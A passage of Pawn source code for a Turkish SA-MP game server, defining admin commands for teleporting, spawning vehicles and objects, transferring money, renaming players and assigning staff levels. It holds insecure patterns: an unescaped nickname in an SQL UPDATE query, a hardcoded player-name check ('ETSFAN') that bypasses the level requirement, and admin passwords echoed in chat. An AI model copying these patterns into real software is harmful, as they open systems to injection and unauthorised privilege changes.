	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
//////////////////////////////
CMD:transfer(playerid, params[])
{
	new id1, id2, miktar;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/transfer", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			if (sscanf(params, "uui", id1, id2,miktar)) SendSyntaxMessage(playerid, "/transfer <gonderen> <alan> <miktar>");
			else
				if (IsPlayerConnected(id1) && IsPlayerConnected(id2)) // If the player is a valid playerid (he's connected)
				{
					if(APlayerData[id1][PlayerMoney] < miktar) return SendClientMessage(playerid, -1, "{FF0000}Para alýnacak kiþide bu kadar para yok!");
					// ISIM BUL
					new name1[MAX_PLAYER_NAME];
					new name2[MAX_PLAYER_NAME];
					new string[255];
					GetPlayerName(id1, name1, sizeof(name1));
					GetPlayerName(id2, name2, sizeof(name2));
					//
				    RewardPlayer(id1,-miktar,0);
				    RewardPlayer(id2,miktar,0);
				    //
				    format(string, sizeof(string), "{FFFFFF}[BILGI]: Hesabýnýzdan %d $ miktari kadar para %s oyuncuna aktarildi.", miktar,name2);
				    SendClientMessage(id1,0xC4C4C4FF, string);

				    format(string, sizeof(string), "{FFFFFF}[BILGI]: %s oyuncusundan ,  %d $ miktar kadar para hesabiniza aktarildi.", name1,miktar);
				    SendClientMessage(id2,0xC4C4C4FF, string);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "HATA VAR LAN");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
//////////////////////////////


// Spawns the object at the location given by the player
CMD:object(playerid, params[])
{
    // Setup local variables
	new ObjectModel, ObjID, Msg[128], Float:x, Float:y, Float:z, Float:Angle;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/object", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "iffff", ObjectModel, x, y, z, Angle)) SendSyntaxMessage(playerid, "/object <Obje modeli> <x> <y> <z> <angle>");
			else
			{
				// Spawn the object 5 units north of the player
				ObjID = CreateObject(ObjectModel, x, y, z, 0.0, 0.0, Angle, 250.0);
				// Inform the player about it
				format(Msg, 128, "You spawned object-id %i (model-id = %i) at coords: x=%4.2f, y=%4.2f, z=%4.2f", ObjID, ObjectModel, x, y, z);
				SendClientMessage(playerid, 0x00FF00FF, Msg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Spawns the pickup at the location given by the player
CMD:pickup(playerid, params[])
{
    // Setup local variables
	new PickupModel, PickID, Msg[128], Float:x, Float:y, Float:z, PickupType;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/pickup", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "ifffi", PickupModel, x, y, z, PickupType)) SendSyntaxMessage(playerid, "/pickup <Pickup Model> <x> <y> <z> <PickupType>");
			else
			{
				// Spawn the pickup
				PickID = CreatePickup(PickupModel, PickupType, x, y, z, -1);
				// Inform the player about it
				format(Msg, 128, "You spawned pickup-id %i (model-id = %i) at coords: x=%4.2f, y=%4.2f, z=%4.2f", PickID, PickupModel, x, y, z);
				SendClientMessage(playerid, 0x00FF00FF, Msg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Spawns the vehicle at the location given by the player
CMD:vehicle(playerid, params[])
{
    // Setup local variables
	new VehicleModel, vID, Msg[128], Float:x, Float:y, Float:z, Float:Angle, SpawnDelay;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/vehicle", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
			if (sscanf(params, "iffffi", VehicleModel, x, y, z, Angle, SpawnDelay)) SendSyntaxMessage(playerid, "/vehicle <vehicle model> <x> <y> <z> <Angle> <SpawnDelay>");
			else
			{
				// Spawn the vehicle at the location specified by the player (also set max-fuel and save the model for the vehicle)
				vID = Vehicle_Create(VehicleModel, x, y, z, Angle, random(126), random(126), SpawnDelay);
				// Inform the player about it
				format(Msg, 128, "You spawned vehicle-id %i (model-id = %i) at coords: x=%4.2f, y=%4.2f, z=%4.2f", vID, VehicleModel, x, y, z);
				SendClientMessage(playerid, 0x00FF00FF, Msg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Deletes the given vehicle from the game
CMD:delvehicle(playerid, params[])
{
    // Setup local variables
	new vID, Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/delvehicle", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 4 || Root[playerid] == 1)
		{
			if (sscanf(params, "i", vID)) SendSyntaxMessage(playerid, "/delvehicle <Araç ID>");
			else
			{
  				if(AVehicleData[vID][StaticVehicle] == true) return SendClientMessage(playerid, -1, "{FF0000}Bu araç statik araç!");
				if(AVehicleData[vID][Owned] == true) return SendClientMessage(playerid, -1, "{FF0000}Bu aracýn sahibi var!");
				if(ArabaSirket[vID] != -1) return SendClientMessage(playerid, -1, "{FF0000}Bu araç þirket aracý!");
				if(TrailerSakliKasa[vID] != -1) return SendClientMessage(playerid, -1, "{FF0000}Bu araç gizli kasa!");

				// Destroy the given vehicle
 				if(Flashing[vID] == true)
				{
	    			KillTimer(FlashTime[vID]);
	    			Flashing[vID] = false;
				}
				DestroyVehicle(vID);
				// Inform the player about it
				format(Msg, 128, "You deleted vehicle-id %i", vID);
				SendClientMessage(playerid, 0x00FF00FF, Msg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Deletes the given vehicle from the game
CMD:delobject(playerid, params[])
{
    // Setup local variables
	new oID, Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/delobject", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "i", oID)) SendSyntaxMessage(playerid, "/delobject <obje ID>");
			else
			{
				// Destroy the given vehicle
				DestroyObject(oID);
				// Inform the player about it
				format(Msg, 128, "You deleted object-id %i", oID);
				SendClientMessage(playerid, 0x00FF00FF, Msg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Ports the player to the given coordinates
CMD:portloc(playerid, params[])
{
	// Setup local variables
	new Float:x, Float:y, Float:z, PortMsg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/portloc", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 2 || Root[playerid] == 1)
		{
			// Check if the player has a wanted level of less than 3
			if (APlayerData[playerid][PlayerWanted] < 3)
			{
				// Check if the player is not jailed
				if (APlayerData[playerid][PlayerJailed] == 0)
				{
					if (sscanf(params, "fff", x, y, z)) SendSyntaxMessage(playerid, "/portloc <x> <y> <z>");
					else
					{
						// Port the player to the given location
						SetPlayerPos(playerid, x, y, z);
						// Let the player know about it
						format(PortMsg, 128, "You have been ported to location: %4.2f, %4.2f, %4.2f", x, y, z);
						SendClientMessage(playerid, 0x00FF00FF, PortMsg);
					}
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /portloc when you're in jail");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /portloc when you're wanted");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Ports the player to the given player
CMD:goto(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Float:x, Float:y, Float:z, PortMsg[128], IntID, WorldID;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/goto", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] > 0)
		{
			// Check if the player has a wanted level of less than 3
			//if (GetPlayerWantedLevel(playerid) < 3)
			//{
				// Check if the player is not jailed
				if (APlayerData[playerid][PlayerJailed] == 0)
				{
					if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/goto <ID>");
					else
					{
						// Check if that other player is online
						if (IsPlayerConnected(OtherPlayer))
						{
						    if(APlayerData[OtherPlayer][SpectateID] != -1) return SendClientMessage(playerid, -1, "{FF0000}Spec'de olan birisine ýþýnlanamazsýnýz!");

							// Get the location of the other player
							GetPlayerPos(OtherPlayer, x, y, z);
							IntID = GetPlayerInterior(OtherPlayer);
							WorldID = GetPlayerVirtualWorld(OtherPlayer);

							APlayerData[playerid][PreviousX] = x;
 							APlayerData[playerid][PreviousY] = y;
  							APlayerData[playerid][PreviousZ] = z;
   							APlayerData[playerid][PreviousInt] = IntID;

							if(IsPlayerInAnyVehicle(playerid))
							{
								SetVehiclePos(GetPlayerVehicleID(playerid), x+2.0, y+2.0, z+3);
								LinkVehicleToInterior(GetPlayerVehicleID(playerid), IntID);
								SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), WorldID);

								foreach(new i : Player)
								{
		    						if(GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid))
		    						{
		        						SetPlayerInterior(i, IntID);
	        							SetPlayerVirtualWorld(i, WorldID);
		    						}
								}
							}else{
								SetPlayerPos(playerid, x+2.0, y+2.0, z);
								SetPlayerInterior(playerid, IntID);
								SetPlayerVirtualWorld(playerid, WorldID);
							}
							/*
							// Port the player to the given location
							SetPlayerVirtualWorld(playerid, WorldID);
							SetPlayerInterior(playerid, IntID);
							SetPlayerPos(playerid, x, y, z + 3.0);
							*/
							// Let the player know about it
							format(PortMsg, 128, "Isýnlandýgýnýz Pos: %4.2f, %4.2f, %4.2f", x+5.0, y+5.0, z+3.0);
							SendClientMessage(playerid, 0x00FF00FF, PortMsg);
						}
						else
						    SendClientMessage(playerid, 0xFF0000FF, "Bu ID'e Sahip bir oyuncu yok.");
					}
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Hapisdenizi goto yapamazsýnýz.");
			/*}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Aranýyorken goto olamazsiniz.");*/
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Ports one player to another player
CMD:tele(playerid, params[])
{
	// Setup local variables
	new Player1, Player2, Float:x, Float:y, Float:z, PortMsg[128], IntID, WorldID, Name[24], AdminName[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/tele", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 2 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] > 1)
		{
			if (sscanf(params, "uu", Player1, Player2)) SendSyntaxMessage(playerid, "/tele <Iþýnlanacak kiþi> <Iþýnlanacaðý kiþi>");
			else
			{
				// Check if player1 is online
				if (APlayerData[Player1][LoggedIn] == true)
				{
					// Check if player2 is online
					if (APlayerData[Player2][LoggedIn] == true)
					{
					    if(playerid == Player1)return SendClientMessage(playerid, 0xFF0000AA,"/Tele komutunu baþkasýna ýþýnlamak için kullanamazsýn!");
					    if(playerid == Player2)return SendClientMessage(playerid, 0xFF0000AA,"/Tele komutunu kendine ýþýnlamak için kullanamazsýn!");
					    // Get the name of the admin and the second player
					    GetPlayerName(playerid, AdminName, sizeof(AdminName));
					    GetPlayerName(Player2, Name, sizeof(Name));
						// Get the location of the second player
						GetPlayerPos(Player2, x, y, z);
						IntID = GetPlayerInterior(Player2);
						WorldID = GetPlayerVirtualWorld(Player2);
						// Port the first player to player2's location
						SetPlayerVirtualWorld(Player1, WorldID);
						SetPlayerInterior(Player1, IntID);
						SetPlayerPos(Player1, x, y, z + 3.0);
						// Let the first player know he's been ported
						format(PortMsg, 128, "{00FF00}You have been ported to player {FFFF00}%s{00FF00} by {FFFF00}%s", Name, AdminName);
						SendClientMessage(Player1, 0xFFFFFFFF, PortMsg);
					}
					else
					    SendClientMessage(playerid, 0xFF0000FF, "Player2 isn't online");
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "Player1 isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Ports the player to the given vehicle
CMD:portvehicle(playerid, params[])
{
	// Setup local variables
	new Car, Float:x, Float:y, Float:z, PortMsg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/portvehicle", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 2 || Root[playerid] == 1)
		{
			// Check if the player has a wanted level of less than 3
			if (APlayerData[playerid][PlayerWanted] < 3)
			{
				// Check if the player is not jailed
				if (APlayerData[playerid][PlayerJailed] == 0)
				{
					if (sscanf(params, "i", Car)) SendSyntaxMessage(playerid, "/portvehicle <Araç ID>");
					else
					{
						// Get the location of the car
						GetVehiclePos(Car, x, y, z);
						// Port the player to the given location
						SetPlayerPos(playerid, x, y, z + 3.0);
						// Let the player know about it
						format(PortMsg, 128, "You have been ported to location: %4.2f, %4.2f, %4.2f", x, y, z + 3.0);
						SendClientMessage(playerid, 0x00FF00FF, PortMsg);
					}
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /portvehicle when you're in jail");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You cannot use /portvehicle when you're wanted");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:fsetlevel(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Levelt, Msg[128], Name[24], AdminName[24], OldLevel;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/fsetlevel", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", OtherPlayer, Levelt)) SendSyntaxMessage(playerid, "/fsetlevel <ID> <Level>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
				    // Get the old level of the other player
				    OldLevel = APlayerData[OtherPlayer][PlayerLevel];
					// Get the playername of the admin
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					// Also get the name of the player that has been promoted
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Let all players know about it
					if (OldLevel != Levelt)
					{
						// Check if the player has been promoted or demoted
						if (OldLevel < Levelt)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, AdminLevelName[Levelt]);
						if (OldLevel > Levelt)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, AdminLevelName[Levelt]);
						SendClientMessageToAll(0x00FF00FF, Msg);
						//FakeLevel[OtherPlayer] = Level;
					}
					else
						SendClientMessage(playerid, 0xFF0000FF, "Other player's level hasn't been changed");
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
// Admin Giriþ Komutu
CMD:admgiris(playerid, params[])
{
	if(APlayerData[playerid][PlayerFLevel] == 0) return 0;
	if(APlayerData[playerid][PlayerLevel] > 0) return SendClientMessage(playerid, -1, "{FF0000}Zaten admin giriþi yapmýþsýnýz!");
	ShowPlayerDialog(playerid, 4747, DIALOG_STYLE_INPUT, "{FF4040}Canakkale Meslek Sunucusu Yönetici Giriþi", "{DDDDDD}Lütfen Admin þifrenizi doðru giriniz:", "Giriþ", "Ýptal");
	return 1;
}

// Admin Þifresi Belirleme Komutu
CMD:admsifre(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Zufre[350], Msg[500];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/admsifre", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[350]", OtherPlayer, Zufre)) SendSyntaxMessage(playerid, "/admsifre <ID> <Þifre>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
					format(APlayerData[OtherPlayer][PlayerAdmPassword], 350, Zufre);
					format(Msg, 500, "{FF4040}ADMIN %s {DDDDDD}adminlik þifrenizi {80FFFF}%s {DDDDDD}olarak deðiþtirdi.", GetName(playerid), Zufre);
					SendClientMessage(OtherPlayer, -1, Msg);
					format(Msg, 500, "{FF4040}%s'nin {DDDDDD}adminlik þifrenizi {80FFFF}%s {DDDDDD}olarak deðiþtirdiniz.", GetName(OtherPlayer), Zufre);
					SendClientMessage(playerid, -1, Msg);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "Oyuncu oyunda deðil!");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


// Sets the admin-level of another player
CMD:changenick(playerid, params[])
{
	new OtherPlayer, NewNick[24], Msg[128];

	SendAdminText(playerid, "/changenick", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[24]", OtherPlayer, NewNick)) SendSyntaxMessage(playerid, "/changenick <ID> <Yeni Nick>");
			else
			{
			        if(IsPlayerConnected(OtherPlayer))
					{
                        if(strfind(NewNick, "ö", true) != -1 || strfind(NewNick, "þ", true) != -1 || strfind(NewNick, "ð", true) != -1 || strfind(NewNick, "ç", true) != -1 || strfind(NewNick, "ý", true) != -1 || strfind(NewNick, "ü", true) != -1)
						{
					        SendClientMessage(playerid,-1,"SEDO TURKCE SEDOO");
					    }
					    else
					    {
		   					if(SQL::RowExistsEx("oyuncular", "Nick", NewNick)) return SendClientMessage(playerid, -1, "{FF0000}Bu isimde bir oyuncu hesabý bulunmakta!");

							for(new HouseID; HouseID < MAX_HOUSES; HouseID++)
							{
			    				if(AHouseData[HouseID][Owned] == false) continue;
			    				if(!strcmp(AHouseData[HouseID][Owner], GetName(OtherPlayer), true))
			    				{
			        				format(AHouseData[HouseID][Owner], 24, NewNick);
			        				House_UpdateEntrance(HouseID);
			        				HouseFile_Save(HouseID);
			    				}
							}
/*
							for(new BusinessID; BusinessID < MAX_BUSINESS; BusinessID++)
							{
			    				if(ABusinessData[BusinessID][Owned] == false) continue;
			    				if(!strcmp(ABusinessData[BusinessID][Owner], GetName(OtherPlayer), true))
			    				{
			        				format(ABusinessData[BusinessID][Owner], 24, NewNick);
			        				Business_UpdateEntrance(BusinessID);
			        				BusinessFile_Save(BusinessID);

			    				}
							}
*/
							for(new TollID; TollID < MAX_TOLLGATES; TollID++)
							{
							    if(ATollGates[TollID][GateID] == 0) continue;
							    if(!strcmp(ATollGates[TollID][GateOwner], GetName(OtherPlayer), true))
							    {
			    					format(ATollGates[TollID][GateOwner], 24, NewNick);
			    					format(Msg, 128, "{FF0000}Ücretli Giþe( %d$ )\n{00CED1}Sahip: {DDDDDD}%s", ATollGates[TollID][TollPrice], ATollGates[TollID][GateOwner]);
									UpdateDynamic3DTextLabelText(ATollGates[TollID][Gate3D], -1, Msg);
									SaveTollGate(TollID);
								}
				            }

							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'in nickini {00CED1}%s {F8F8FF}olarak deðiþtirdi.", GetName(playerid), GetName(OtherPlayer), NewNick);
							SendClientMessageToAll(-1, Msg);

							new query[128];
		    				format(query, sizeof(query), "UPDATE `bank_accounts` SET Owner='%s' WHERE Owner='%s'", NewNick, GetName(OtherPlayer));
		    				mysql_tquery(BankSQLHandle, query);

							SetPlayerName(OtherPlayer, NewNick);
							GetPlayerName(OtherPlayer, APlayerData[OtherPlayer][PlayerName], 24);
							Oyuncu_Kaydet(OtherPlayer);
							}
					}
					else
				    SendClientMessage(playerid, 0xFF0000FF, "Oyuncu oyunda degil");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// Sets the admin-level of another player
CMD:setlevel(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Levels, Msg[128], Name[24], AdminName[24], OldLevel;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/setlevel", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", OtherPlayer, Levels)) SendSyntaxMessage(playerid, "/setlevel <ID> <Level>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
				    if(Levels < 0 || Levels > 7) return SendClientMessage(playerid, -1, "{FF0000}En fazla 7 level en az 0 level verebilirsiniz!");
				    // Get the old level of the other player
				    OldLevel = APlayerData[OtherPlayer][PlayerLevel];
					// Get the playername of the admin
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					// Also get the name of the player that has been promoted
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Store the level of the player
					APlayerData[OtherPlayer][PlayerLevel] = Levels;
					APlayerData[OtherPlayer][PlayerFLevel] = Levels;
					// Let all players know about it
					if (OldLevel != Levels)
					{
						// Check if the player has been promoted or demoted
						if (OldLevel < Levels)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, AdminLevelName[Levels]);
						if (OldLevel > Levels)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, AdminLevelName[Levels]);
						SendClientMessageToAll(0x00FF00FF, Msg);
					}
					else
						SendClientMessage(playerid, 0xFF0000FF, "Level degistirilmedi");
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "Oyuncu oyunda degil");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Sets the admin-level of another player
CMD:setleveldj(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Levelmi, Msg[128], Name[24], AdminName[24], OldLevel;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/setleveldj", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1 || !strcmp("ETSFAN", GetName(playerid), true))
		{
			if (sscanf(params, "ui", OtherPlayer, Levelmi)) SendSyntaxMessage(playerid, "/setleveldj <ID> <Level>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
				    if(Levelmi < 0 || Levelmi > 2) return SendClientMessage(playerid, -1, "{FF0000}En fazla 2 level en az 0 level verebilirsiniz!");
				    // Get the old level of the other player
				    OldLevel = APlayerData[OtherPlayer][PlayerDjLevel];
					// Get the playername of the adms in
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					// Also get the name of the player that has been promoted
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Store the level of the player
					APlayerData[OtherPlayer][PlayerDjLevel] = Levelmi;
					// Let all players know about it
					if (OldLevel != Levelmi)
					{
						// Check if the player has been promoted or demoted
						if (Levelmi == 0)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, DjLevelName[Levelmi]);
						if (Levelmi >= 1)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, DjLevelName[Levelmi]);
						SendClientMessageToAll(0x00FF00FF, Msg);
					}
					else
						SendClientMessage(playerid, 0xFF0000FF, "Other player's level hasn't been changed");
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
CMD:setlevelrehber(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Levelmi, Msg[128], Name[24], AdminName[24], OldLevel;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/setlevelrehber", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", OtherPlayer, Levelmi)) SendSyntaxMessage(playerid, "/setlevelrehber <ID> <Level>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
				    if(Levelmi < 0 || Levelmi > 3) return SendClientMessage(playerid, -1, "{FF0000}En fazla 3 level en az 0 level verebilirsiniz!");
				    // Get the old level of the other player
				    OldLevel = APlayerData[OtherPlayer][PlayerRehberLevel];
					// Get the playername of the adms in
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					// Also get the name of the player that has been promoted
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Store the level of the player
					APlayerData[OtherPlayer][PlayerRehberLevel] = Levelmi;
					// Let all players know about it
					if (OldLevel != Levelmi)
					{
						// Check if the player has been promoted or demoted
						if (Levelmi == 0)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, RehberLevelName[Levelmi]);
						if (Levelmi >= 1)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, RehberLevelName[Levelmi]);
						SendClientMessageToAll(0x00FF00FF, Msg);
					}
					else
						SendClientMessage(playerid, 0xFF0000FF, "Other player's level hasn't been changed");
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Sets the admin-level of another player
CMD:setleveldonator(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Levelmi, Msg[128], Name[24], AdminName[24], OldLevel;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/setleveldonator", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", OtherPlayer, Levelmi)) SendSyntaxMessage(playerid, "/setleveldonator <ID> <Level>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
				    if(Levelmi < 0 || Levelmi > 1) return SendClientMessage(playerid, -1, "{FF0000}En fazla 1 level en az 0 level verebilirsiniz!");
				    // Get the old level of the other player
				    OldLevel = APlayerData[OtherPlayer][PlayerDonLevel];
					// Get the playername of the adms in
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					// Also get the name of the player that has been promoted
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Store the level of the player
					APlayerData[OtherPlayer][PlayerDonLevel] = Levelmi;
					// Let all players know about it
					if (OldLevel != Levelmi)
					{
						// Check if the player has been promoted or demoted
						if (OldLevel < Levelmi)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, DonLevelName[Levelmi]);
						if (OldLevel > Levelmi)
							format(Msg, 128, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%s {F8F8FF}yaptý.", AdminName, Name, DonLevelName[Levelmi]);
						SendClientMessageToAll(0x00FF00FF, Msg);
					}
					else
						SendClientMessage(playerid, 0xFF0000FF, "Other player's level hasn't been changed");
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Refuel the player's vehicle
CMD:fuel(playerid, params[])
{
	// Setup local variables
	new vID;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/fuel", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			// Check if the player is inside a vehicle
			if (IsPlayerInAnyVehicle(playerid))
			{
			    // Get the vehicleid
			    vID = GetPlayerVehicleID(playerid);
			    // Refuel the vehicle
			    AVehicleData[vID][Fuel] = MaxFuel;
				// Let the player know about it
				SendClientMessage(playerid, 0x00FF00FF, "Your vehicle is refuelled");
			}
			else
				SendClientMessage(playerid, 0x00FF00FF, "You're not driving a vehicle");
		}
		else
		    return 0;
	}
	else
	    return 0;

